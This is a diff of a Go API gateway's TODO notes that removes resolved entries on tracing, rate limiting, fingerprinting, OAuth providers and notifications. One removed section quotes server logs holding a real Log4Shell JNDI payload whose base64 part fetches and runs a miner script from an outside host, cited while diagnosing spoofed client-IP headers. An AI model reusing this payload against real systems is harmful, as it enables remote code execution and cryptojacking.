@@ -2,32 +2,6 @@
 
 # TODO tasks for the project
 
-# Request identifier and tracing — RESOLVED
-
-OpenTelemetry + Open Telemetry server: https://opentelemetry.io/
-
-Should we add X-Request-ID to all requests and responses for tracing?
-Are there any other ways to trace requests?
-Are there libraries that already handle tracing?
-Do libraries stick to an specific tracing product or standard?
-
-**Answered/done:** went with real distributed tracing via OpenTelemetry
-(the standard, not a homegrown `X-Request-ID`) — `middleware/tracing.go`,
-`gateway/tracing.go` (`InitTracing`, the OTLP/HTTP exporter setup), the
-top-level `tracing.enabled`/`tracing.endpoint`/`tracing.insecure` config
-(not under `management`), and the `tracing` middleware name. Uses
-`go.opentelemetry.io/contrib`'s `otelhttp` for both the server-side span
-(per request) and the reverse-proxy transport (per backend call) instead
-of hand-rolled instrumentation — genuinely distributed, not just one
-isolated span per hop: an incoming W3C `traceparent` continues the
-caller's trace, and it's propagated forward to whatever backend a proxy
-route sends the request to. See `doc/middleware/tracing.md` for the full
-reference, including exactly how this is tested (an in-memory exporter for
-unit tests, no real collector needed; a plain `httptest.Server` standing
-in for one to verify the actual OTLP export and cross-hop propagation) —
-confirmed for real too, against a live `tg` binary and a throwaway fake
-collector process, not just the test suite.
-
 ## Logs
 
 Show logs in the dashboard
@@ -128,92 +102,8 @@ Health check configuration for the routes configured in the gateway:
 * Integrate with cloud storage providers (e.g., AWS S3, Google Cloud Storage)
 
 
-# Fix GEO IP — RESOLVED
-
-These logs show on megabox-qa:
-
-```
-2026/03/23 17:43:08 logging.go:27: 2026-03-23T17:43:08.271Z - 87.120.191.93:56554 "GET /t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}')" 307 0.16ms
-2026/03/23 17:43:08 clientinfo.go:73: Error getting geo data for IP t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}'): FreeIPAPI returned status code 403
-2026/03/23 17:43:08 logging.go:27: 2026-03-23T17:43:08.594Z - 87.120.191.93:56554 "GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D/31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z%7D%27%29" 404 0.10ms
-2026/03/23 17:43:08 clientinfo.go:73: Error getting geo data for IP t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}'): FreeIPAPI returned status code 403
-```
-
-Why IP is not being parsed correctly? Is it because of the attack vector in the URL?
-
-**Root cause, found while doing an unrelated recap of the project (2026-09-04):
-not the URL at all.** `session.GetClientIP` trusted the
-`X-Forwarded-For`/`X-Real-IP`/`X-Client-IP` headers unconditionally, from
-*any* client, with no concept of "is this request even coming through a
-proxy I control." The JNDI probe's request presumably also carried a
-crafted `X-Forwarded-For` value (not shown in the truncated log excerpt
-above) that GetClientIP took at face value and handed straight to the
-geo-lookup API and the log line — this was never about parsing the URL,
-it was about trusting a header that any direct client can set to
-literally anything.
-
-**Fixed**: those headers are now only honored when the request's real TCP
-peer is loopback or an RFC 1918/RFC 4193 private-range address
-(`session.isTrustedProxy`, via stdlib `net.IP.IsLoopback()`/`IsPrivate()`
-— the same default Rails' `ActionDispatch::RemoteIp` uses). No
-configuration needed or added: a direct external client can never present
-a private-range address as its own real peer address in the first place
-(not routable from the public internet), so this closes the spoofing hole
-(which also affected IP-based rate limiting and analytics, not just this
-log line) for the common case — a reverse proxy on the same host or in
-the same private network/Docker/Kubernetes cluster — without asking an
-operator to list anything. See `session.GetClientIP`'s doc comment
-(`session/clientinfo.go`).
-
-**Follow-up, a distinct bug under the same log line (2026-09-09):** a real
-deployment showed `Error getting geo data for IP 192.168.1.60: IPLocate
-returned status code 401` — an entirely legitimate, correctly-trusted
-private-range client IP (not a spoofing attempt this time; the header
-trust fix above was working as intended), still being sent to the
-geolocation API, which obviously has nothing to say about a non-routable
-address. Root cause: `GetGeoDataFromIP`'s own "skip this IP" check
-(`session/ipgeo.go`) only ever matched a literal `"127."`/`"localhost"`
-string prefix, so it caught IPv4 loopback and nothing else — every other
-non-routable range (RFC 1918 private, RFC 4193 IPv6 unique-local,
-link-local, IPv6 loopback) fell through to a real, always-failing network
-call, on every single request from a client on the same private network
-as a reverse proxy in front of this gateway — a normal, common deployment
-shape, not an edge case. Fixed the same way the header-trust check above
-already does it: a real `net.ParseIP` classification
-(`session.isNonRoutable`, `IsLoopback`/`IsPrivate`/`IsLinkLocalUnicast`/
-`IsLinkLocalMulticast`/`IsUnspecified`) instead of a string prefix match.
-Verified for real: a live gateway with a deliberately invalid geo API key
-logged the 401 for a spoofed public IP (8.8.8.8) but logged nothing at all
-for a spoofed 192.168.1.60 — the exact address from the report.
-
 # Rate limiter
 
-- [x] Store persistent info about attackers (IP, user agent, etc.) — done:
-      every time the rate limiter blocks an IP (request-rate limit, too many
-      errors, or a vulnerability-scan hit), it now writes a `db.BlockedClient`
-      row (reason, path, trigger count, block start/end, plus the same
-      user-agent/geo/fingerprint fields already collected for traffic
-      metrics). This is a durable history distinct from the live in-memory
-      stats: `middleware/ratelimiter.go`'s `cleanupLoop` still discards an
-      IP's tracked state once its block expires and it goes quiet, but the
-      DB row survives that. Exposed via `GET /_/api/rate-limiter/blocked`
-      (`ip`/`limit`/`offset` filters) and the "Blocked Clients History"
-      table on the Rate Limiter Stats admin page. See
-      `db/blockedclientrepository.go` and `doc/middleware/rate-limiter.md`.
-    - [x] Show blocked IPs (with start and end date of the block) — done,
-          same feature as above (`blockedAt`/`blockedUntil`).
-    - [x] Info about blocked IPs (number of requests, user agent, etc.), geo
-          info, etc. — done: `triggerCount`, user agent, and geo/fingerprint
-          fields are all recorded per block (same feature as above).
-    - [x] Show a map of attackers by country — done: `GET
-          /api/rate-limiter/blocked` now also returns `latitude`/`longitude`
-          per block (same nullable-`*float32`, non-zero-only pattern as
-          `RequestDetail`), and the Rate Limiter Stats page renders them on
-          a clustered world map (`BlockedClientsWorldMap.tsx`, lazy-loaded
-          like the existing traffic-requests map) with a "Top Attacker
-          Countries" breakdown below it — same coordinate fallback as the
-          traffic map (recorded GPS coordinates when available, else a
-          country-centroid lookup).
 - Request Details
     - Show IP address
     - Filter by IP address
@@ -223,22 +113,13 @@ for a spoofed 192.168.1.60 — the exact address from the report.
     - Show the METHOD + PATH
 - Does JA4 fingerprinting make any sense at all?
     - Answered, at least for JA4H specifically: not as a stable per-user
-      identifier — it varies per request type for the same real client
-      (see doc/middleware/ja4-fingerprint.md's "What it does"). Two
-      follow-ups shipped to address this directly:
-        - TLS-level JA4 (`server.tls.enabled` required) — much more
-          stable, since it's a property of the client's TLS stack, not of
-          any individual HTTP request. See `gateway/ja4tls.go`.
-        - `StableFingerprint` — a reduced-entropy, non-TLS fallback built
-          only from headers that don't vary by request type. See
-          `middleware/fingerprint/stable.go`.
-      All three then got consolidated into a single `Fingerprint` +
-      `FingerprintType` field pair (`db.ClientInfo`, `X-User-Data`, the
-      stats API) rather than three parallel columns, picked by priority
-      (TLS JA4 > stable > JA4H) via `fingerprint.SelectFingerprint` — see
-      `middleware/fingerprint/select.go` and
-      doc/middleware/ja4-fingerprint.md's "One consolidated fingerprint,
-      not three".
+      identifier — it varies per request type for the same real client. TLS
+      JA4 (much more stable, needs `server.tls.enabled`) and a
+      reduced-entropy, non-TLS `StableFingerprint` fallback were added
+      alongside it, and all three consolidated into one `Fingerprint` +
+      `FingerprintType` field pair picked by priority (TLS JA4 > stable >
+      JA4H). See doc/middleware/ja4-fingerprint.md's "One consolidated
+      fingerprint, not three".
     - Can we use it to identify users? — still no for JA4H alone; TLS JA4
       and the stable fingerprint are meaningfully better for "same real
       client," but none of the three should be trusted as a hard 1:1
@@ -251,180 +132,6 @@ for a spoofed 192.168.1.60 — the exact address from the report.
     - Filter by JA4 fingerprint separate parts? — still open, and now
       applies to three fields instead of one.
 
-# Authentication providers
-
-- [x] More OAuth2 login providers beyond Google/GitHub — done for
-      Microsoft (Entra ID / Azure AD, `providers/microsoft.go`), Facebook
-      (`providers/facebook.go`), and Apple (`providers/apple.go`), all
-      following the same shape as Google/GitHub — for Apple, "the same
-      shape" needed two new extension points on the generic
-      `AuthenticationProvider` (`providers/providers.go`) rather than
-      fitting unchanged. See README.md's "Authentication Providers"
-      section (a subsection per provider: where to get credentials, which
-      credentials are needed, and a config sample) and AGENTS.md's
-      `providers/` section for how to add another one.
-- [x] **Apple ("Sign in with Apple")** — done, including full JWKS
-      signature verification of its ID token. It genuinely doesn't fit
-      the shape the other providers share, which is why it was held back
-      initially: its "client secret" is a JWT the gateway signs itself
-      (`buildAppleClientSecret`, using a Team ID/Key ID/EC private key —
-      config fields with no equivalent elsewhere — regenerated fresh on
-      every login via a new `AuthenticationProvider.ClientSecretFunc`
-      hook, since a long-lived one would eventually expire on a
-      long-running gateway rather than being rebuilt at every startup);
-      its callback needs `response_mode=form_post` (a new
-      `AuthenticationProvider.ResponseMode` hook), which `Callback`
-      handles by reading `state`/`code` via `r.FormValue` instead of
-      `r.URL.Query()` — one code path for every provider's GET callback
-      and Apple's POST one; and there's no REST "get current user" call
-      at all — `UserDataFetcher.FetchUserData` gained the full
-      `*http.Request` and `*oauth2.Token` (not just an access-token
-      string) so Apple's implementation can decode the ID token already
-      in the token response and, on a user's one-time first
-      authorization only, the name Apple includes directly in the
-      callback request. The ID token's signature is verified against
-      Apple's published keys (`github.com/MicahParks/keyfunc/v3` +
-      `github.com/golang-jwt/jwt/v5`, pointed at
-      `https://appleid.apple.com/auth/keys`) rather than just decoded —
-      `apple_test.go` proves this with a real self-signed key and a fake
-      JWKS server, not just claim-shape assertions, including that a
-      wrong audience/issuer/expiry/signing key are each correctly
-      rejected.
-
-# Notifications
-
-- [x] **Generic notification system** (`notification/`, `db.Notification`/
-      `NotificationDelivery`/`NotificationChannelLink`/
-      `NotificationLinkCode`, `handlers/api_notifications.go`) — requested
-      by a downstream app (Academia, via a cross-session message) that
-      needed in-app + email notifications and didn't want to duplicate
-      delivery/storage logic per app, since the gateway already owns user
-      identity, sessions, and SMTP config. Built as a shared-interface-
-      plus-registry design mirroring `providers/`'s OAuth2 architecture
-      (`notification.Provider`, one implementation per channel, one
-      registry in `notification.Service`) rather than hardcoding email —
-      the ask expanded mid-design to "keep providers generic, add Telegram
-      now, WhatsApp later," which this shape accommodates for free. See
-      [doc/notifications.md](./notifications.md) for the full design.
-  - Scope decisions made explicitly (each was a real fork, not an
-    arbitrary default): notification creation reuses the existing
-    admin-owned API token mechanism rather than a new "server token"
-    concept (this gateway has no such concept today, unlike the
-    `gots-template` framework the requesting app is built on); no
-    `Source`/`AppID` scoping field, since this gateway has no multi-tenant/
-    multi-app concept anywhere else either — every deployment is one
-    gateway per app; Telegram delivery long-polls `getUpdates` rather than
-    registering a webhook, so no inbound network exposure is required
-    regardless of deployment shape; the email answer-link's credential is
-    an opaque random token (the same random-bytes-then-hash pattern
-    `auth.TokenService` already uses for API tokens), not an HMAC
-    signature, since it needed no new secret in config.
-  - Deliberately deferred, none of it blocking: a `POST
-    /api/notifications/batch` endpoint (a caller can loop the single-create
-    endpoint today; batching's exact shape — partial failures? one email or
-    N? — isn't worth guessing without a real caller); per-user
-    notification preferences/opt-out (would be its own table, not a field
-    bolted onto `Notification`); templated email bodies beyond plain
-    title/body/action-links.
-- [x] **Delivery retries and history** — a same-day follow-up once the
-      user asked "do we have notification history/status, and retries on
-      failure": neither existed at first (delivery outcomes were recorded
-      but never surfaced via the API, and a failed send was simply final).
-      Added `db.NotificationDelivery.AttemptNumber`/`NextRetryAt`, a
-      `notification.Service.RetryFailedDeliveries`/`RunRetryWorker` pair
-      (backoff schedule 1m/5m/30m/2h, not config-exposed — this gateway's
-      volume is too low for the exact numbers to matter to an operator),
-      and `GET /api/notifications/{id}/deliveries` (owner or admin) to
-      expose the resulting history. Key design choice: a retry *appends* a
-      new `NotificationDelivery` row rather than mutating the failed one,
-      so the full attempt-by-attempt history is exactly what the history
-      endpoint already needed to show — retries and history turned out to
-      be the same data model change, not two. Verified for real against a
-      live `tg` binary: a genuinely unreachable SMTP port, two real
-      automatic retries (backdating `NextRetryAt` to avoid a multi-hour
-      real wait, but the retry worker's own 30-second tick and the actual
-      resend were both real), and a real email finally delivered on the
-      third attempt.
-- [x] **Multi-recipient create and per-user channel preference** — the
-      next same-day follow-up: "Recipients can be a list of users, and each
-      user can decide to receive notifications by one different provider."
-      `CreateInput.UserID` (single) became `UserIDs []string`: `Create`
-      stores one independent `db.Notification` per recipient (same
-      type/title/body/actions, each with its own read state, delivery
-      attempts, and answer) rather than requiring the caller to loop —
-      this is effectively the `POST /api/notifications/batch` endpoint
-      floated and deliberately deferred in the very first entry above,
-      just folded into the primary create call instead of a second
-      endpoint, since there was no real caller yet to validate a separate
-      batch shape against and this needed no new one. `db.NotificationPreference`
-      (one row per user, resolved by `resolveChannelsForUser`) lets a user
-      set a single preferred channel that wins over "every configured
-      channel" whenever a `POST /api/notifications` call doesn't name
-      explicit `channels` — an explicit `channels` list still overrides the
-      preference, so a caller that genuinely needs a specific channel for
-      one notification isn't blocked by whatever the user picked as their
-      default. Verified for real against a live `tg` binary: one call
-      notifying two users produced two independent notifications
-      (answering one left the other's read/response state untouched), and
-      a user's telegram preference was shown to override the
-      "every-configured-channel" default even with email actually
-      configured and telegram not — the delivery history recorded exactly
-      one skipped telegram attempt, never an email one.
-- [x] **Outbound response webhook** — asked directly: "Do you handle the
-      callbacks for the user responses?" The honest answer at the time was
-      no, and worse, there wasn't even a way for the calling app's backend
-      to poll for a response either (`Service.Get`, unlike `ListDeliveries`,
-      has no admin bypass — only the notification's own owner can read it
-      back). `config.ResponseWebhookConfig` (`notification.responseWebhook`)
-      now fires an HMAC-SHA256-signable POST once, automatically, the
-      moment a response is recorded on any channel. The interesting design
-      choice: implemented as an ordinary `notification.Provider`
-      (`webhook.go`'s `ResponseWebhookProvider`) purely to inherit
-      `deliver`/`recordDelivery`'s existing retry-with-backoff and
-      delivery-history machinery for free, rather than this one channel
-      getting its own, weaker reliability story — a failed callback shows
-      up in `GET /api/notifications/{id}/deliveries` with
-      `channel: "response_webhook"` and retries on the same schedule as
-      email/Telegram. It's explicitly excluded from
-      `resolveChannelsForUser`'s "every configured channel" default (it
-      isn't something a notification is ever delivered *to*) and only ever
-      invoked directly from `recordValidatedResponse`. Verified for real
-      against a live `tg` binary and a real HTTP receiver: the actual
-      payload, and an independently-recomputed HMAC signature that matched
-      exactly.
-- [x] **Computed status, per notification and per batch** — asked
-      directly: "Do we have status of Failed, sent, pending, for the whole
-      notification and for each of the recipients?" Until then, the answer
-      was "only in raw form" — `GET /api/notifications/{id}/deliveries`
-      gave every attempt, but nothing reduced that to a single answer, and
-      there was no "batch" concept at all: a multi-recipient `Create`
-      returned an unlinked array of notifications with no shared
-      identifier, so a caller had no way to ask "how did the whole blast
-      go" short of tracking every returned ID itself. Two decisions,
-      settled directly rather than assumed: (1) the rollup rule for a
-      notification with channels in different states is worst-first —
-      `pending` beats `failed` beats `sent`, so a notification isn't
-      reported "failed" while it still has a retry pending, and isn't
-      reported "sent" only because one channel got through while another
-      is still failing; `skipped` channels are excluded from the rollup
-      entirely rather than counting against it. (2) a batch *is* a
-      first-class concept: `db.Notification.BatchID`, generated fresh on
-      every `Create` call (even a single-recipient one — "a batch of one",
-      no special case needed), returned as `batchId` on
-      `CreateNotificationResponse` and on every `Notification`. New
-      `GET /api/notifications/{id}/status` (owner or admin) and
-      `GET /api/notifications/batches/{batchId}/status` (admin only — a
-      batch can span several different users' own notifications, so there's
-      no single owning user to scope it to) compute these fresh from
-      `ListDeliveries` on every call rather than maintaining a separately-
-      updated status column that could drift from the underlying attempts.
-      Verified for real against a live `tg` binary: a two-recipient batch
-      pointed at a genuinely unreachable SMTP port reported `pending` for
-      both individually and `{sent:0, pending:2, failed:0}` for the batch;
-      after a real automatic retry succeeded (same mechanism as the retries
-      feature above), both flipped to `sent` and the batch to
-      `{sent:2, pending:0, failed:0}`.
-
 # Gateway feature gaps (vs. Kong/Traefik/nginx/Envoy/Tyk/KrakenD/APISIX/AWS API Gateway)
 
 Deep-dive comparison done 2026-08-28, checked against the actual code (not
@@ -433,18 +140,6 @@ we're working through these one at a time — see status notes.
 
 ## Tier 1 — near-universal, currently absent
 
-- [x] **Response compression (brotli/zstd/gzip/deflate)** — done: `middleware/compression.go`,
-      `management.compression` flag / `compression` middleware name. See
-      `doc/middleware/compression.md`.
-- [x] **TLS termination** — done: static cert/key files (`server.tls.*`),
-      automatic HTTP→HTTPS redirect (`redirectPort`, default 80),
-      zero-downtime certificate hot-reload on renewal (watches the cert/key
-      files independently of config reload), **and** automatic ACME /
-      Let's Encrypt issuance+renewal (`server.tls.acme`, mutually exclusive
-      with `certFile`/`keyFile` — no wildcard domains, since that needs a
-      `dns-01` challenge this integration doesn't implement). See
-      `gateway/tls.go`, `config/tls.go`, and the README's "TLS / HTTPS"
-      section (including the certificate file format reference).
 - [ ] **Upstream health checks (active + passive)** for the load balancer
       (`gateway/loadbalancer.go`). Today it only reacts to a failed connection
       *during* a request — no background probing, no ejection of a backend
@@ -476,9 +171,6 @@ we're working through these one at a time — see status notes.
       X-Content-Type-Options, CSP) — same shape as `cors.go`.
 - [ ] **Request body size limits** — no `MaxBytesReader`/content-length cap
       anywhere, including on the load balancer's body-buffering retry path.
-- [x] **OpenTelemetry tracing** — done: see the resolved "Request identifier
-      and tracing" section near the top of this file and
-      `doc/middleware/tracing.md`.
 - [ ] **Structured/JSON logging + Prometheus metrics export.** Our
       metrics/logging are custom and in-memory only today.
 - [ ] **Header/URL transformation rules** — add/strip arbitrary
@@ -500,9 +192,8 @@ GraphQL federation, gRPC/gRPC-Web transcoding, WAF-style request inspection
 deployments (natural extension of the load balancer — a `weight:` per
 target), a scripting/plugin execution model (Lua/WASM — we already have a
 compiled-Go extension point, see `doc/middleware_development.md`), generic
-SAML/OIDC beyond named, hardcoded providers (see the "Authentication
-providers" section above for the ones done, including Apple; a generic
-config-driven OIDC provider covering arbitrary IdPs, including
-self-hosted ones like Keycloak/Authentik, is the bigger, not-yet-started
-piece this bullet is really about), a self-service developer portal. Not
-pursuing unless users specifically ask.
+SAML/OIDC beyond named, hardcoded providers (a generic config-driven OIDC
+provider covering arbitrary IdPs, including self-hosted ones like
+Keycloak/Authentik, is the bigger, not-yet-started piece this bullet is
+really about), a self-service developer portal. Not pursuing unless users
+specifically ask.
